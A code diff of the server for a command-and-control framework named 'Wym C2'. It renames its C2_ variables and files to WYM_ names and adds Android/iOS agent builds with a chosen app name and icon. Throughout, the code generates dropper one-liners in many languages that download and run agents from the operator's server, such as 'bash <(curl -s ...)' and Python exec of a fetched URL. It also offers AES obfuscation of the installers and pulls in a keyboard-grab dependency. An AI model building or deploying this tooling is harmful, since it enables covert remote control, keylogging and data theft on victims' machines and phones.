@@ -23,6 +23,7 @@ import secrets
 import shutil
 import stat
 import subprocess
+import tempfile
 import sys
 import threading
 import time
@@ -64,6 +65,11 @@ import auth
 from database import get_conn, init_db, utcnow
 from database import create_token, get_tokens, get_token, update_token_last_used, delete_token
 
+try:
+    import icons  # server-local module (launcher icon generator)
+except ImportError:
+    from . import icons  # package-relative fallback
+
 BASE_DIR = Path(__file__).resolve().parent
 PROJECT_DIR = BASE_DIR.parent
 CLIENTS_DIR = PROJECT_DIR / "clients"
@@ -71,9 +77,9 @@ CLIENTS_DIR = PROJECT_DIR / "clients"
 # Per-platform runtime state: a project folder shared between Windows and
 # Unix/WSL keeps its own artifacts — Windows uses bare names, Unix/WSL a
 # "_wsl" suffix — so they never collide:
-#   Windows : c2.db, .agent_token, .server.pid, .server.port, server.log
+#   Windows : wym.db, .agent_token, .server.pid, .server.port, server.log
 #                                                              (install.ps1, 8000)
-#   Unix    : c2_wsl.db, .agent_token_wsl, .server.pid_wsl, .server.port_wsl,
+#   Unix    : wym_wsl.db, .agent_token_wsl, .server.pid_wsl, .server.port_wsl,
 #             server_wsl.log                                   (install.sh, 8001)
 # (venv: .venv vs .venv-wsl. builds/, shared/ and collected/ hold unique
 # (per-target/per-task) names, so they stay shared across platforms.)
@@ -85,28 +91,28 @@ COLLECTED_DIR = BASE_DIR / "collected"  # files pulled from agents
 BUILDS_DIR = BASE_DIR / "builds"        # compiled agent binaries
 # Everything the cross-compiler touches lives under builds/: scratch space,
 # the shared rust target cache and the per-job build logs (error/fix tracking).
-BUILD_WORK_DIR = BUILDS_DIR / "_build_tmp"     # scratch for gcc/dotnet/javac/go
+BUILD_WORK_DIR = BUILDS_DIR / "_build_tmp"     # legacy scratch; builds now use per-build tempdir
 BUILD_CARGO_TARGET = BUILDS_DIR / "_cargo_target"  # shared rust incremental cache
 BUILD_LOG_DIR = BUILDS_DIR / "logs"            # persisted build logs + history
 BUILD_HISTORY_FILE = BUILD_LOG_DIR / "history.json"
 
-log = logging.getLogger("c2")
+log = logging.getLogger("wym")
 
-STALE_AFTER = int(os.environ.get("C2_STALE_AFTER", "90"))
-DEAD_AFTER = int(os.environ.get("C2_DEAD_AFTER", "600"))
+STALE_AFTER = int(os.environ.get("WYM_STALE_AFTER", "90"))
+DEAD_AFTER = int(os.environ.get("WYM_DEAD_AFTER", "600"))
 
 # 'sent' tasks (delivered to the agent) that were never reported within this
 # window are re-queued as 'pending' on the agent's next checkin. Covers the
 # case where the agent died mid-task and came back.
-RETRY_AFTER = int(os.environ.get("C2_RETRY_AFTER", "180"))
+RETRY_AFTER = int(os.environ.get("WYM_RETRY_AFTER", "180"))
 
 # Upload size cap (MB) applied to dashboard/shared/collected/explorer uploads
-MAX_UPLOAD_MB = int(os.environ.get("C2_MAX_UPLOAD_MB", "512"))
+MAX_UPLOAD_MB = int(os.environ.get("WYM_MAX_UPLOAD_MB", "512"))
 MAX_UPLOAD = MAX_UPLOAD_MB * 1024 * 1024
 
-# Set C2_TLS=1 when the app is served over HTTPS (reverse proxy or uvicorn
+# Set WYM_TLS=1 when the app is served over HTTPS (reverse proxy or uvicorn
 # --ssl-*). Marks session cookies Secure so they are never sent over HTTP.
-TLS_ENABLED = os.environ.get("C2_TLS", "").lower() in ("1", "true", "yes", "on")
+TLS_ENABLED = os.environ.get("WYM_TLS", "").lower() in ("1", "true", "yes", "on")
 
 
 def _copy_limited(src, dst, limit: int = MAX_UPLOAD) -> int:
@@ -128,11 +134,11 @@ def _copy_limited(src, dst, limit: int = MAX_UPLOAD) -> int:
 # ── Explorer sandbox ──────────────────────────────────────────────────
 # The web file browser/editor starts at the current working directory
 # (the directory the server runs from) by default. Operators can pin a
-# different base with C2_EXPLORER_ROOT or restore the project-only
-# sandbox with C2_EXPLORER_UNRESTRICTED=0.
+# different base with WYM_EXPLORER_ROOT or restore the project-only
+# sandbox with WYM_EXPLORER_UNRESTRICTED=0.
 _exp_default_root = str(BASE_DIR)
-EXPLORER_ROOT = Path(os.environ.get("C2_EXPLORER_ROOT", _exp_default_root)).resolve()
-EXPLORER_UNRESTRICTED = os.environ.get("C2_EXPLORER_UNRESTRICTED", "1").lower() in (
+EXPLORER_ROOT = Path(os.environ.get("WYM_EXPLORER_ROOT", _exp_default_root)).resolve()
+EXPLORER_UNRESTRICTED = os.environ.get("WYM_EXPLORER_UNRESTRICTED", "1").lower() in (
     "1", "true", "yes",
 )
 
@@ -141,14 +147,14 @@ def _exp_blocked(target: Path) -> bool:
     """Paths inside the sandbox root the explorer must never expose.
 
     Unrestricted mode (default) exposes every file on the host. When the
-    operator opts back into the sandbox with C2_EXPLORER_UNRESTRICTED=0 the
+    operator opts back into the sandbox with WYM_EXPLORER_UNRESTRICTED=0 the
     explorer hides the server's own secrets (agent token, sqlite db) and web
     assets (editing static/ would be a persistent XSS vector for every
     operator).
     """
     if EXPLORER_UNRESTRICTED:
         return False
-    if target.name in (".agent_token", ".agent_token_wsl", "c2.db", "c2_wsl.db"):
+    if target.name in (".agent_token", ".agent_token_wsl", "wym.db", "wym_wsl.db"):
         return True
     blocked_roots = (BASE_DIR / "static", PROJECT_DIR / ".git")
     return any(target == b or b in target.parents for b in blocked_roots)
@@ -261,7 +267,7 @@ async def lifespan(app: FastAPI):
         print(f"[*] cleaned up {cleaned} expired session(s)")
 
     # --- shared secret used by agents (persisted across restarts) ---
-    env_token = os.environ.get("C2_AGENT_TOKEN", "").strip()
+    env_token = os.environ.get("WYM_AGENT_TOKEN", "").strip()
     token_file = BASE_DIR / f".agent_token{OS_SUFFIX}"
     if env_token:
         app.state.agent_token = env_token
@@ -274,11 +280,11 @@ async def lifespan(app: FastAPI):
         print(f"    X-Agent-Token: {app.state.agent_token}")
 
     # --- dashboard bootstrap credentials ---
-    username = os.environ.get("C2_USER", "")
-    password = os.environ.get("C2_PASSWORD", "")
+    username = os.environ.get("WYM_USER", "")
+    password = os.environ.get("WYM_PASSWORD", "")
     if not username:
         username = "admin"
-        print("[!] C2_USER not set, defaulting to 'admin'")
+        print("[!] WYM_USER not set, defaulting to 'admin'")
     # Pass the configured password through unchanged: sync_default_user() keeps
     # an existing user's password when the argument is empty (fresh installs
     # still get a random password printed here), so a plain restart never
@@ -307,8 +313,8 @@ app = FastAPI(
     description="Wym C2 are What you missed is Command and Control Frameworks",
     version="1.0",
     lifespan=lifespan,
-    docs_url="/api/docs" if os.environ.get("C2_API_DOCS") == "1" else None,
-    openapi_url="/api/openapi.json" if os.environ.get("C2_API_DOCS") == "1" else None,
+    docs_url="/api/docs" if os.environ.get("WYM_API_DOCS") == "1" else None,
+    openapi_url="/api/openapi.json" if os.environ.get("WYM_API_DOCS") == "1" else None,
     redoc_url=None,
 )
 app.mount("/static", StaticFiles(directory=BASE_DIR / "static"), name="static")
@@ -553,7 +559,7 @@ async def api_checkin(body: CheckinBody, _: None = Depends(require_agent_token))
         conn.close()
 
 
-RESULT_SIZE_LIMIT = int(os.environ.get("C2_RESULT_LIMIT", "50000"))  # chars
+RESULT_SIZE_LIMIT = int(os.environ.get("WYM_RESULT_LIMIT", "50000"))  # chars
 
 
 @app.post("/api/result")
@@ -1216,18 +1222,18 @@ def _build_agent_command(language: str, server: str, token: str,
         if shell_os == "windows":
             return (
                 f"curl.exe -sL \"{build_dl}\" -o \"$env:TEMP\\agent{ext}\"; "
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"& \"$env:TEMP\\agent{ext}\"{flags}"
             )
         if shell_os == "cmd":
             return (
                 f"curl.exe -sL \"{build_dl}\" -o \"%TEMP%\\agent{ext}\""
-                f" && set \"C2_SERVER={server}\" && set \"C2_TOKEN={token}\""
+                f" && set \"WYM_SERVER={server}\" && set \"WYM_TOKEN={token}\""
                 f" && \"%TEMP%\\agent{ext}\"{flags}"
             )
         return (
             f"curl -sL {build_dl} -o /tmp/agent && chmod +x /tmp/agent && "
-            f"C2_SERVER={server} C2_TOKEN={token} /tmp/agent{flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} /tmp/agent{flags}"
         )
 
     if build_on_server and language in COMPILED_LANGUAGES:
@@ -1235,19 +1241,19 @@ def _build_agent_command(language: str, server: str, token: str,
             jar = f"{server}/download/build/java?target={target}&token={token}"
             if shell_os == "windows":
                 return (
-                    f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
-                    f"curl.exe -sL \"{jar}\" -o \"$env:TEMP\\c2agent_java.jar\"; "
-                    f"java.exe -jar \"$env:TEMP\\c2agent_java.jar\"{flags}"
+                    f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
+                    f"curl.exe -sL \"{jar}\" -o \"$env:TEMP\\wymagent_java.jar\"; "
+                    f"java.exe -jar \"$env:TEMP\\wymagent_java.jar\"{flags}"
                 )
             if shell_os == "cmd":
                 return (
-                    f"curl.exe -sL \"{jar}\" -o \"%TEMP%\\c2agent_java.jar\""
-                    f" && set \"C2_SERVER={server}\" && set \"C2_TOKEN={token}\""
-                    f" && java -jar \"%TEMP%\\c2agent_java.jar\"{flags}"
+                    f"curl.exe -sL \"{jar}\" -o \"%TEMP%\\wymagent_java.jar\""
+                    f" && set \"WYM_SERVER={server}\" && set \"WYM_TOKEN={token}\""
+                    f" && java -jar \"%TEMP%\\wymagent_java.jar\"{flags}"
                 )
             return (
-                f"curl -sL {jar} -o /tmp/c2agent_java.jar && "
-                f"C2_SERVER={server} C2_TOKEN={token} java -jar /tmp/c2agent_java.jar{flags}"
+                f"curl -sL {jar} -o /tmp/wymagent_java.jar && "
+                f"WYM_SERVER={server} WYM_TOKEN={token} java -jar /tmp/wymagent_java.jar{flags}"
             )
         t = BUILD_TARGETS.get(target, {})
         ext = t.get("ext", "")
@@ -1257,9 +1263,9 @@ def _build_agent_command(language: str, server: str, token: str,
         in_cmd = shell_os == "cmd"
         q = "%TEMP%" if in_cmd else "$env:TEMP"
         envset = (
-            (f"set \"C2_SERVER={server}\" && set \"C2_TOKEN={token}\" && ")
+            (f"set \"WYM_SERVER={server}\" && set \"WYM_TOKEN={token}\" && ")
             if in_cmd else
-            (f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; ")
+            (f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; ")
         )
         if in_cmd:
             builds = {
@@ -1277,7 +1283,7 @@ def _build_agent_command(language: str, server: str, token: str,
                 ),
                 "rust": (
                     f"{envset}cargo build --release"
-                    f" && .\\target\\release\\c2agent.exe{flags}"
+                    f" && .\\target\\release\\wymagent.exe{flags}"
                 ),
                 "c": (
                     f"{envset}curl.exe -sL \"{dl_src}\" -o \"{q}\\agent.c\""
@@ -1322,61 +1328,61 @@ def _build_agent_command(language: str, server: str, token: str,
         else:
             builds = {
             "python": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.py\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; python.exe $p{flags}"
             ),
             "go": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"go build -o $env:TEMP\\agent.exe {dl_src}; & $env:TEMP\\agent.exe{flags}"
             ),
             "csharp": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"curl.exe -sL '{dl_src}' -o $env:TEMP\\agent.cs; "
                 f"dotnet new console -o $env:TEMP\\a --force; "
                 f"Copy-Item $env:TEMP\\agent.cs $env:TEMP\\a\\Program.cs; "
                 f"dotnet build $env:TEMP\\a -o $env:TEMP\\out -q; & $env:TEMP\\out\\a.exe{flags}"
             ),
             "rust": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
-                f"cargo build --release; & .\\target\\release\\c2agent.exe{flags}"
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
+                f"cargo build --release; & .\\target\\release\\wymagent.exe{flags}"
             ),
             "c": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"curl.exe -sL '{dl_src}' -o $env:TEMP\\agent.c; "
                 f"gcc -o $env:TEMP\\agent.exe $env:TEMP\\agent.c -lcurl; "
                 f"& $env:TEMP\\agent.exe{flags}"
             ),
             "cpp": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"curl.exe -sL '{dl_src}' -o $env:TEMP\\agent.cpp; "
                 f"g++ -o $env:TEMP\\agent.exe $env:TEMP\\agent.cpp -lcurl; "
                 f"& $env:TEMP\\agent.exe{flags}"
             ),
             "powershell": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.ps1\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; & $p{flags}"
             ),
             "bash": (
-                f"C2_SERVER={server} C2_TOKEN={token} bash <(curl -s {dl_src}){flags}"
+                f"WYM_SERVER={server} WYM_TOKEN={token} bash <(curl -s {dl_src}){flags}"
             ),
             "nodejs": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.js\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; node.exe $p{flags}"
             ),
             "lua": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.lua\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; lua $p{flags}"
             ),
             "php": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.php\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; php.exe $p{flags}"
             ),
             "ruby": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.rb\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; ruby.exe $p{flags}"
             ),
             "perl": (
-                f"$env:C2_SERVER='{server}'; $env:C2_TOKEN='{token}'; "
+                f"$env:WYM_SERVER='{server}'; $env:WYM_TOKEN='{token}'; "
                 f"$p=\"$env:TEMP\\agent.pl\"; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest '{dl_src}' -OutFile $p; perl.exe $p{flags}"
             ),
         }
@@ -1385,49 +1391,49 @@ def _build_agent_command(language: str, server: str, token: str,
     # ── Linux / Darwin (bash/zsh) ──────────────────────────────
     builds = {
         "python": (
-            f"C2_SERVER={server} C2_TOKEN={token} python3 -c "
+            f"WYM_SERVER={server} WYM_TOKEN={token} python3 -c "
             f"\"exec(__import__('urllib.request').urlopen('{dl_src}').read())\""
         ),
         "go": (
-            f"C2_SERVER={server} C2_TOKEN={token} go run {dl_src}{flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} go run {dl_src}{flags}"
         ),
         "csharp": (
             f"# .NET SDK required\n"
-            f"C2_SERVER={server} C2_TOKEN={token} dotnet script {dl_src}{flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} dotnet script {dl_src}{flags}"
         ),
         "rust": (
-            f"C2_SERVER={server} C2_TOKEN={token} cargo run --release{flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} cargo run --release{flags}"
         ),
         "c": (
             f"# requires gcc + libcurl-dev\n"
-            f"C2_SERVER={server} C2_TOKEN={token} "
+            f"WYM_SERVER={server} WYM_TOKEN={token} "
             f"gcc -o /tmp/agent {dl_src} -lcurl && /tmp/agent{flags}"
         ),
         "cpp": (
             f"# requires g++ + libcurl-dev\n"
-            f"C2_SERVER={server} C2_TOKEN={token} "
+            f"WYM_SERVER={server} WYM_TOKEN={token} "
             f"g++ -o /tmp/agent {dl_src} -lcurl && /tmp/agent{flags}"
         ),
         "powershell": (
-            f"C2_SERVER={server} C2_TOKEN={token} pwsh -c \"$(irm '{dl_src}')\"{flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} pwsh -c \"$(irm '{dl_src}')\"{flags}"
         ),
         "bash": (
-            f"C2_SERVER={server} C2_TOKEN={token} bash <(curl -s {dl_src}){flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} bash <(curl -s {dl_src}){flags}"
         ),
         "nodejs": (
-            f"C2_SERVER={server} C2_TOKEN={token} node <(curl -s {dl_src}){flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} node <(curl -s {dl_src}){flags}"
         ),
         "lua": (
-            f"C2_SERVER={server} C2_TOKEN={token} lua <(curl -s {dl_src}){flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} lua <(curl -s {dl_src}){flags}"
         ),
         "php": (
-            f"C2_SERVER={server} C2_TOKEN={token} php <(curl -s {dl_src}){flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} php <(curl -s {dl_src}){flags}"
         ),
         "ruby": (
-            f"C2_SERVER={server} C2_TOKEN={token} ruby <(curl -s {dl_src}){flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} ruby <(curl -s {dl_src}){flags}"
         ),
         "perl": (
-            f"C2_SERVER={server} C2_TOKEN={token} perl <(curl -s {dl_src}){flags}"
+            f"WYM_SERVER={server} WYM_TOKEN={token} perl <(curl -s {dl_src}){flags}"
         ),
     }
     return builds.get(language, builds["python"])
@@ -1442,7 +1448,9 @@ async def generate_page(request: Request):
     return templates.TemplateResponse(
         request,
         "generate.html",
-        {"user": user, "generated": None, "default_server": default_server},
+        {"user": user, "generated": None, "default_server": default_server,
+         "gen_mobile": False, "gen_mobile_url": "", "gen_mobile_icon": "none",
+         "gen_app_name": ""},
     )
 
 
@@ -1460,6 +1468,8 @@ def generate_post(
     shell_os: str = Form("windows"),
     obfuscate: str = Form(""),
     ext: str = Form(""),
+    app_name: str = Form(""),
+    mobile_icon: str = Form("none"),
 ):
     user = get_current_user(request)
     if not user:
@@ -1467,56 +1477,83 @@ def generate_post(
     server = server.strip().rstrip("/") or str(request.base_url).rstrip("/")
     effective_token = token.strip() if token.strip() else app.state.agent_token
 
+    eff_interval = max(1, interval)
+    eff_jitter = max(0.0, jitter)
+    eff_verbose = verbose == "on"
+    is_mobile = language in MOBILE_LANGUAGES
+    if is_mobile:
+        # APK/IPA always need a server-side build and carry no installer/oneliner.
+        build_on_server = "on"
+        target = language
+        shell_os = "windows"
+        obfuscate = ""
+
     # If build_on_server, trigger build first. Runs on a worker thread so a long
     # cross-compile never freezes the event loop / dashboard.
     binary_ready = False
     gen_build_error = ""
-    if build_on_server == "on" and language in COMPILED_LANGUAGES:
-        path, err = _build_binary(language, target)
+    binary_download_url = ""
+    if build_on_server == "on" and language in COMPILED_LANGUAGES | MOBILE_LANGUAGES:
+        path, err = _build_binary(
+            language, target,
+            icon=mobile_icon, name=app_name,
+            cfg={"server": server, "token": effective_token,
+                 "interval": eff_interval},
+        )
         if not err:
             binary_ready = True
+            if is_mobile:
+                fname = _sanitize_mobile_name(app_name)
+                binary_download_url = (
+                    f"{server}/download/build/{language}?"
+                    + urllib.parse.urlencode({"name": fname}))
+            else:
+                binary_download_url = (
+                    f"{server}/download/build/{language}?"
+                    + urllib.parse.urlencode({"target": target}))
         else:
             gen_build_error = err
 
-    eff_interval = max(1, interval)
-    eff_jitter = max(0.0, jitter)
-    eff_verbose = verbose == "on"
+    installer_source = ""
+    install_url = ""
+    if not is_mobile:
+        installer_shell, payload_kind = _normalize_payload(shell_os)
 
-    installer_shell, payload_kind = _normalize_payload(shell_os)
-
-    # Compact payload + viewable installer source (config embedded).
-    # Every config value (server, token, interval, jitter, verbose, shell OS)
-    # is baked into the installer script body. The rendered body is stored so
-    # the public payload URL can stay completely clean (zero query params) and
-    # still return the exact same script when executed on the target host.
-    installer_source = _build_installer(
-        language=language,
-        server=server,
-        token=effective_token,
-        interval=eff_interval,
-        jitter=eff_jitter,
-        verbose=eff_verbose,
-        target=target,
-        shell_os=installer_shell,
-        build_on_server=binary_ready,
-        ext=ext,
-    )
-    # Store the body per language+server on the matching shell route so the
-    # clean /agent/{lang}/installer.{sh,ps1} endpoints can serve it. When the
-    # obfuscate toggle is on, what gets stored (and served / viewed) is the
-    # decrypt-and-run stub + ciphertext, never the plaintext body.
-    if obfuscate == "on":
+        # Compact payload + viewable installer source (config embedded).
+        # Every config value (server, token, interval, jitter, verbose, shell OS)
+        # is baked into the installer script body. The rendered body is stored so
+        # the public payload URL can stay completely clean (zero query params) and
+        # still return the exact same script when executed on the target host.
+        installer_source = _build_installer(
+            language=language,
+            server=server,
+            token=effective_token,
+            interval=eff_interval,
+            jitter=eff_jitter,
+            verbose=eff_verbose,
+            target=target,
+            shell_os=installer_shell,
+            build_on_server=binary_ready,
+            ext=ext,
+        )
+        # Store the body per language+server on the matching shell route so the
+        # clean /agent/{lang}/installer.{sh,ps1} endpoints can serve it. When the
+        # obfuscate toggle is on, what gets stored (and served / viewed) is the
+        # decrypt-and-run stub + ciphertext, never the plaintext body.
+        if obfuscate == "on":
+            if installer_shell == "windows":
+                installer_source = _obfuscate_ps(installer_source, server, effective_token)
+            else:
+                installer_source = _obfuscate_sh(installer_source, server, effective_token)
         if installer_shell == "windows":
-            installer_source = _obfuscate_ps(installer_source, server, effective_token)
+            _installer_ps[(language, server)] = installer_source
+            install_url = f"{server}/agent/{language}/installer.ps1"
         else:
-            installer_source = _obfuscate_sh(installer_source, server, effective_token)
-    if installer_shell == "windows":
-        _installer_ps[(language, server)] = installer_source
-        install_url = f"{server}/agent/{language}/installer.ps1"
+            _installer_sh[(language, server)] = installer_source
+            install_url = f"{server}/agent/{language}/installer.sh"
+        command = _payload_oneliner(payload_kind, install_url)
     else:
-        _installer_sh[(language, server)] = installer_source
-        install_url = f"{server}/agent/{language}/installer.sh"
-    command = _payload_oneliner(payload_kind, install_url)
+        command = binary_download_url
 
     return templates.TemplateResponse(
         request,
@@ -1539,6 +1576,10 @@ def generate_post(
             "installer_source": installer_source,
             "gen_build_error": gen_build_error,
             "gen_ext": ext,
+            "gen_mobile": is_mobile,
+            "gen_mobile_url": binary_download_url,
+            "gen_mobile_icon": mobile_icon,
+            "gen_app_name": app_name.strip(),
         },
     )
 
@@ -1565,7 +1606,10 @@ AGENT_FILES = {
 }
 
 COMPILED_LANGUAGES = {"go", "csharp", "rust", "c", "cpp", "java"}
+MOBILE_LANGUAGES = {"android", "ios"}
 INTERPRETED_LANGUAGES = set(AGENT_FILES.keys()) - COMPILED_LANGUAGES
+
+MOBILE_ICONS = tuple(icons.ICON_KINDS)
 
 
 @app.get("/download/agent/{language}", include_in_schema=False)
@@ -1675,14 +1719,14 @@ def _build_installer(language: str, server: str, token: str, interval: int,
                 # JDK required on target; javac compiles into a private temp dir
                 # so no .class files are left in the working directory.
                 run = (
-                    'J="$(mktemp -d ${TMPDIR:-/tmp}/c2j.XXXXXX)"; '
+                    'J="$(mktemp -d ${TMPDIR:-/tmp}/wymj.XXXXXX)"; '
                     f"curl -fsSL {_shell_quote(dl)} -o \"$J/agent.java\" && "
                     f'javac -encoding UTF-8 -d "$J" "$J/agent.java" && '
                     f'java -cp "$J" Agent --server {S} --token {T} {opt}'
                 )
         elif language in ("go", "rust", "csharp", "c", "cpp"):
             ext = ext or BUILD_TARGETS.get(target, {}).get("ext", "")
-            out = _shell_quote(f"/tmp/c2agent{ext}")
+            out = _shell_quote(f"/tmp/wymagent{ext}")
             if build_on_server:
                 # Pre-built binary from the server: just fetch + chmod + run.
                 # No toolchain required on the target host.
@@ -1700,16 +1744,16 @@ def _build_installer(language: str, server: str, token: str, interval: int,
                     # serde, rdev). Scaffold a temp crate and build it.
                     run = (
                         f'curl -fsSL {_shell_quote(dl)} -o "$SRC" && '
-                        'D="$(mktemp -d ${TMPDIR:-/tmp}/c2rs.XXXXXX)" && '
+                        'D="$(mktemp -d ${TMPDIR:-/tmp}/wymrs.XXXXXX)" && '
                         'mv "$SRC" "$D/agent.rs" && cd "$D" && '
                         "cat > Cargo.toml <<'RSCF'\n"
                         "[package]\n"
-                        'name = "c2agent"\n'
+                        'name = "wymagent"\n'
                         'version = "0.1.0"\n'
                         'edition = "2021"\n'
                         "\n"
                         "[[bin]]\n"
-                        'name = "c2agent"\n'
+                        'name = "wymagent"\n'
                         'path = "agent.rs"\n'
                         "\n"
                         "[dependencies]\n"
@@ -1719,7 +1763,7 @@ def _build_installer(language: str, server: str, token: str, interval: int,
                         'hostname = "0.4"\n'
                         'rdev = { version = "0.5", features = ["unstable_grab"] }\n'
                         "RSCF\n"
-                        f"cargo build --release && ./target/release/c2agent --server {S} --token {T} {opt}"
+                        f"cargo build --release && ./target/release/wymagent --server {S} --token {T} {opt}"
                     )
                 elif language in ("c", "cpp"):
                     cc = "g++" if language == "cpp" else "gcc"
@@ -1735,7 +1779,7 @@ def _build_installer(language: str, server: str, token: str, interval: int,
         }.get(language, "src")
         script = (
             '#!/bin/sh\n'
-            'AGENT="$(mktemp ${TMPDIR:-/tmp}/c2agent.XXXXXX)"\n'
+            'AGENT="$(mktemp ${TMPDIR:-/tmp}/wymagent.XXXXXX)"\n'
             f'SRC="$AGENT.{src_ext}"\n'
             'trap \'rm -f "$AGENT" "$SRC"\' EXIT\n'
             + (f"{fetch}\n" if fetch else "")
@@ -1754,7 +1798,7 @@ def _build_installer(language: str, server: str, token: str, interval: int,
         # URL fetched into $p: prebuilt binary for compiled+build-on-server,
         # otherwise the source script.
         fetch_src = dlq
-        p_assign = f"\"$env:TEMP\\c2agent_{language}.{_agent_ext(language)}\""
+        p_assign = f"\"$env:TEMP\\wymagent_{language}.{_agent_ext(language)}\""
         # LEGO the body using only single-quoted strings -> no nested double
         # quotes, hence no quote-escape issues when piped via irm | iex.
         run = ""
@@ -1776,22 +1820,22 @@ def _build_installer(language: str, server: str, token: str, interval: int,
             run = f"& powershell -NoProfile -ExecutionPolicy Bypass -File $p -Server '{S}' -Token '{T}' -Interval {int(interval)}"
         elif language == "java":
             if build_on_server:
-                p_assign = "\"$env:TEMP\\c2agent_java.jar\""
+                p_assign = "\"$env:TEMP\\wymagent_java.jar\""
                 fetch_src = dl_build_q
                 run = f"& java -jar $p --server '{S}' --token '{T}' {opt}"
             else:
                 # JDK required on target; drop .class into a private folder.
-                p_assign = "\"$env:TEMP\\c2agent_java.java\""
-                run = ("& javac.exe -encoding UTF-8 -d \"$env:TEMP\\c2j\" $p; "
-                       f"& java -cp \"$env:TEMP\\c2j\" Agent --server '{S}' --token '{T}' {opt}")
+                p_assign = "\"$env:TEMP\\wymagent_java.java\""
+                run = ("& javac.exe -encoding UTF-8 -d \"$env:TEMP\\wymj\" $p; "
+                       f"& java -cp \"$env:TEMP\\wymj\" Agent --server '{S}' --token '{T}' {opt}")
         elif language in ("go", "rust", "csharp", "c", "cpp"):
             ext = ext or BUILD_TARGETS.get(target, {}).get("ext", ".exe")
-            out = f"$env:TEMP\\c2agent{ext}"
+            out = f"$env:TEMP\\wymagent{ext}"
             if build_on_server:
                 # Pre-built binary from the server: just fetch + run. $p must be
                 # the binary path (it holds the prebuilt artifact), not a source
                 # path with a language extension.
-                p_assign = f"\"$env:TEMP\\c2agent{ext}\""
+                p_assign = f"\"$env:TEMP\\wymagent{ext}\""
                 fetch_src = dl_build_q
                 run = f"& $p --server '{S}' --token '{T}' {opt}"
             elif language == "go":
@@ -1842,10 +1886,10 @@ import hashlib, hmac as _hmac, base64 as _b64
 
 
 def _obf_key() -> bytes:
-    """AES-256 key (32 bytes). From C2_ENC_KEY env (64 hex), else derived
+    """AES-256 key (32 bytes). From WYM_ENC_KEY env (64 hex), else derived
     deterministically from the agent token (HMAC-SHA256) so a fresh default
     always exists without requiring an env var."""
-    enc = os.environ.get("C2_ENC_KEY", "").strip()
+    enc = os.environ.get("WYM_ENC_KEY", "").strip()
     if enc:
         try:
             raw = bytes.fromhex(enc)
@@ -1853,8 +1897,8 @@ def _obf_key() -> bytes:
                 return raw
         except ValueError:
             pass
-    seed = (app.state.agent_token or "c2-default-seed").encode()
-    return _hmac.new(b"c2-obf-v1", seed, hashlib.sha256).digest()
+    seed = (app.state.agent_token or "wym-default-seed").encode()
+    return _hmac.new(b"wym-obf-v1", seed, hashlib.sha256).digest()
 
 
 def _obf_encrypt(plain: str, key: bytes) -> tuple:
@@ -2044,6 +2088,8 @@ BUILD_TARGETS = {
     "win_x86":     {"os": "windows", "arch": "386",    "ext": ".exe","goos": "windows", "goarch": "386",    "rust": "i686-pc-windows-gnu",             "dotnet": "win-x86",      "cc": "i686-w64-mingw32-gcc", "cxx": "i686-w64-mingw32-g++"},
